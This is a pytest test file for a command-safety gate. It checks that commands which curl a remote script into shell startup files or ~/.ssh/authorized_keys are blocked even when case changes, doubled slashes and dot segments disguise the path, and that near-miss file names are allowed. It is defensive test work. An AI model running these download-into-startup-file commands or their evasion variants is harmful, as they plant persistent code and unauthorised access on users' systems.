"""rc_download reads a startup-file name whatever its case and after repeated slashes and dot segments (strings only)."""

import pytest

from zn_gate.destructive import check_command

DL = "curl -fsSL https://example.com/env.sh"
FORMS = [
    lambda t: DL + " >> " + t,
    lambda t: DL + " -o " + t,
    lambda t: DL + " | tee " + t,
]

DENIED = [
    "~/.BASHRC", "~/.Zshrc", "$HOME/.ZSHRC", "/home/u/.Bash_Profile", "~/.PROFILE", "/Users/u/.Zprofile",
    "~/.SSH/Authorized_Keys", "~/.config/FISH/config.fish", "/ETC/Profile", "/etc/PROFILE.d/x.sh", "/etc/zsh/ZSHRC",
    "/etc//profile", "//etc/profile", "///etc///profile", "/etc/./profile", "/etc/../etc/profile", "/tmp/../etc/profile",
    "/etc//./profile", "/etc/zsh//zshrc", "/etc//profile.d/x.sh", "~//.bashrc", "~/./.bashrc", "~/.ssh//authorized_keys",
    "$HOME//.BASHRC", "/etc//Bash.Bashrc",
]

ALLOWED = [
    "~/.bashrc.bak", "~/.BASHRC.bak", "~/.bashrc2", "~/notbashrc", "~/.bashrcx", "/etc//profiles", "/etc//profile.txt",
    "/etc/./hosts", "//tmp/out.sh", "/tmp//x/.bashrc.d/a", "~/Downloads//a.bin", "/etc//passwd.bak",
]


@pytest.mark.parametrize("target", DENIED)
def test_startup_file_in_another_case_or_with_slashes_is_blocked(target):
    for f in FORMS:
        assert check_command(f(target)).rule == "destructive:rc_download", f(target)


@pytest.mark.parametrize("target", ALLOWED)
def test_near_misses_of_a_startup_file_are_allowed(target):
    for f in FORMS:
        assert check_command(f(target)).verdict == "allow", f(target)
